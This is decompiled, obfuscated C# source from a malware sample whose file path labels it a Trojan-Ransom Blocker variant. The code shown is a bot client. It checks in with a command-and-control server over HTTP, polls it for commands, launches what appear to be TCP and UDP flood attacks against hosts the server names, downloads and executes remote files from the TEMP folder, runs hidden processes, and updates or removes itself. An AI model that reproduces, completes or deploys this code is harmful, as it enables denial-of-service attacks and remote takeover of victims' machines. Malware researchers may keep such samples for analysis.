// Decompiled with JetBrains decompiler
// Type: ?1?.?6?
// Assembly: tutzutzutz, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 24544FBB-E29C-4CD0-A180-E0F7591B8C92
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.hela-60428f68afac01b391496fe7183b4795cc29d1e6528c4ef1f2dec9ea939ee5e7.exe

using \u003F1\u003F;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace \u003F1\u003F
{
  internal class \u003F6\u003F
  {
    private string sOldCommand = string.Empty;

    public void \u003F25\u003F()
    {
      this.\u003F26\u003F();
      new Thread(new ThreadStart(this.\u003F27\u003F)).Start();
    }

    private void \u003F26\u003F()
    {
      string str1 = \u003F75\u003F.\u003F76\u003F("aŤɮͬеԷؠݭ\u0873४੦଼") + \u003F4\u003F.ConfigClass.werqwerqwer + \u003F75\u003F.\u003F76\u003F(".ťɩͱѲզٰܼ") + \u003F4\u003F.ConfigClass.cvbncbcbcbcvbn + \u003F75\u003F.\u003F76\u003F(".ŷɥͫѥծ٧ܼ") + \u003F4\u003F.ConfigClass.girtitzuitzu + \u003F75\u003F.\u003F76\u003F(".ŰɯͫѲզٰܼ") + \u003F4\u003F.ConfigClass.ruirturtrzu;
      while (true)
      {
        try
        {
          string str2 = this.\u003F28\u003F(\u003F4\u003F.ConfigClass.cxvbxcvbxcvbxcvbxcv, str1);
          if (str2.Length > 0)
          {
            if (str2 == \u003F4\u003F.ConfigClass.scfvyxcvyxcvyxc)
              break;
            Environment.Exit(-1);
          }
        }
        catch
        {
        }
        Thread.Sleep(\u003F4\u003F.ConfigClass.sertqwetrwertwer * 60 * 1000);
      }
    }

    private void \u003F27\u003F()
    {
      string str1 = \u003F75\u003F.\u003F76\u003F("aŤɮͬеԶؠݭ\u0873४੦଼") + \u003F4\u003F.ConfigClass.werqwerqwer;
      while (true)
      {
        try
        {
          string str2 = this.\u003F28\u003F(\u003F4\u003F.ConfigClass.cxvbxcvbxcvbxcvbxcv, str1);
          if (str2.Length > 0)
          {
            if (str2 != this.sOldCommand)
            {
              this.\u003F29\u003F(str2);
              this.sOldCommand = str2;
            }
          }
          else
          {
            try
            {
              \u003F11\u003F.\u003F49\u003F();
            }
            catch
            {
            }
            try
            {
              \u003F15\u003F.\u003F54\u003F();
            }
            catch
            {
            }
            try
            {
              \u003F9\u003F.\u003F46\u003F();
            }
            catch
            {
            }
            try
            {
              \u003F13\u003F.\u003F52\u003F();
            }
            catch
            {
            }
            this.sOldCommand = string.Empty;
          }
        }
        catch
        {
        }
        Thread.Sleep(\u003F4\u003F.ConfigClass.sertqwetrwertwer * 60 * 1000);
      }
    }

    private string \u003F28\u003F(string _param1, string _param2)
    {
      ServicePointManager.Expect100Continue = false;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param1);
      httpWebRequest.ContentType = \u003F75\u003F.\u003F76\u003F("@ŐɯͲѴտٺݮ\u0870ॷ\u0A79ହ౭ഹ\u0E64ཥၦᄽቩ፡ᑿᕡᘦ\u177F\u187Bᥤᩢ᭨ᱦᵫṧὧ\u2065");
      httpWebRequest.Method = \u003F75\u003F.\u003F76\u003F("TŌɑ͕");
      httpWebRequest.UserAgent = \u003F4\u003F.ConfigClass.scfvyxcvyxcvyxc;
      byte[] bytes = Encoding.ASCII.GetBytes(_param2);
      httpWebRequest.ContentLength = (long) bytes.Length;
      Stream requestStream = httpWebRequest.GetRequestStream();
      requestStream.Write(bytes, 0, bytes.Length);
      requestStream.Close();
      WebResponse response = httpWebRequest.GetResponse();
      return response != null ? new StreamReader(response.GetResponseStream()).ReadToEnd().Trim() : string.Empty;
    }

    private void \u003F29\u003F(string _param1)
    {
      string[] strArray = new string[0];
      try
      {
        strArray = _param1.Split('*');
      }
      catch
      {
      }
      string key;
      if ((key = strArray[0]) == null)
        return;
      // ISSUE: reference to a compiler-generated field
      if (\u003CPrivateImplementationDetails\u003E\u007B24544FBB\u002DE29C\u002D4CD0\u002DA180\u002DE0F7591B8C92\u007D.\u0024\u0024method0x6000011\u002D1 == null)
      {
        // ISSUE: reference to a compiler-generated field
        \u003CPrivateImplementationDetails\u003E\u007B24544FBB\u002DE29C\u002D4CD0\u002DA180\u002DE0F7591B8C92\u007D.\u0024\u0024method0x6000011\u002D1 = new Dictionary<string, int>(8)
        {
          {
            \u003F75\u003F.\u003F76\u003F("{žɨͣѨլ٭ݥ"),
            0
          },
          {
            \u003F75\u003F.\u003F76\u003F("ażɳͶѣը٬ݭ\u0865"),
            1
          },
          {
            \u003F75\u003F.\u003F76\u003F("}ţɶͣѨլ٭ݥ"),
            2
          },
          {
            \u003F75\u003F.\u003F76\u003F("`ūɪͶѣը٬ݭ\u0865"),
            3
          },
          {
            \u003F75\u003F.\u003F76\u003F("lŨɱͫѨլ٣ݥ"),
            4
          },
          {
            \u003F75\u003F.\u003F76\u003F("sŭɰͫѵ"),
            5
          },
          {
            \u003F75\u003F.\u003F76\u003F("sŵɠ͢Ѷդ"),
            6
          },
          {
            \u003F75\u003F.\u003F76\u003F("tŠɩͬѴդ"),
            7
          }
        };
      }
      int num;
      // ISSUE: reference to a compiler-generated field
      // ISSUE: explicit non-virtual call
      if (!__nonvirtual (\u003CPrivateImplementationDetails\u003E\u007B24544FBB\u002DE29C\u002D4CD0\u002DA180\u002DE0F7591B8C92\u007D.\u0024\u0024method0x6000011\u002D1.TryGetValue(key, out num)))
        return;
      switch (num)
      {
        case 0:
          try
          {
            \u003F11\u003F.sFHost = Convert.ToString(strArray[1]);
            \u003F11\u003F.uPort = ushort.Parse(strArray[2]);
            \u003F11\u003F.iThreads = Convert.ToInt32(strArray[3]);
            \u003F11\u003F.iSSockets = Convert.ToInt32(strArray[4]);
            \u003F11\u003F.\u003F48\u003F();
            break;
          }
          catch
          {
            break;
          }
        case 1:
          try
          {
            \u003F15\u003F.vbnmvbnmvbnmbvnm = Convert.ToString(strArray[1]);
            \u003F15\u003F.adgdsfgsdgdf = Convert.ToInt32(strArray[2]);
            \u003F15\u003F.\u003F53\u003F();
            break;
          }
          catch
          {
            break;
          }
        case 2:
          try
          {
            \u003F9\u003F.sFHost = Convert.ToString(strArray[1]);
            \u003F9\u003F.uPort = ushort.Parse(strArray[2]);
            \u003F9\u003F.iThreads = Convert.ToInt32(strArray[3]);
            \u003F9\u003F.iUDPSockets = Convert.ToInt32(strArray[4]);
            \u003F9\u003F.iPSize = Convert.ToInt32(strArray[5]);
            \u003F9\u003F.\u003F45\u003F();
            break;
          }
          catch
          {
            break;
          }
        case 3:
          try
          {
            \u003F13\u003F.ergtsergsrg = Convert.ToString(strArray[1]);
            \u003F13\u003F.hjmbvmvbmvbnm = ushort.Parse(strArray[2]);
            \u003F13\u003F.mbvmfgzjdfgh = Convert.ToInt32(strArray[3]);
            \u003F13\u003F.zuitzuituzui = Convert.ToInt32(strArray[4]);
            \u003F13\u003F.nmbvmvnvbnm = Convert.ToInt32(strArray[5]);
            \u003F13\u003F.\u003F51\u003F();
            break;
          }
          catch
          {
            break;
          }
        case 4:
          try
          {
            string str = \u003F4\u003F.FunctionClass.\u003F20\u003F(new Random().Next(5, 12)) + \u003F75\u003F.\u003F76\u003F("*Ŧɺͤ");
            new WebClient().DownloadFile(Convert.ToString(strArray[1]), Environment.GetEnvironmentVariable(\u003F75\u003F.\u003F76\u003F("Pņɏ͑")) + \u003F75\u003F.\u003F76\u003F("]") + str);
            new Process()
            {
              StartInfo = {
                FileName = (Environment.GetEnvironmentVariable(\u003F75\u003F.\u003F76\u003F("Pņɏ͑")) + \u003F75\u003F.\u003F76\u003F("]") + str)
              }
            }.Start();
            break;
          }
          catch
          {
            break;
          }
        case 5:
          try
          {
            Process process = new Process()
            {
              StartInfo = new ProcessStartInfo(Convert.ToString(strArray[1]))
            };
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.Start();
            break;
          }
          catch
          {
            break;
          }
        case 6:
          \u003F4\u003F.SystemClass.\u003F33\u003F(Convert.ToString(strArray[1]));
          break;
        case 7:
          if (!(strArray[1] == Environment.MachineName) && !(strArray[1].ToUpper() == \u003F75\u003F.\u003F76\u003F("BŎɍ")))
            break;
          \u003F4\u003F.SystemClass.\u003F34\u003F();
          break;
      }
    }
  }
}
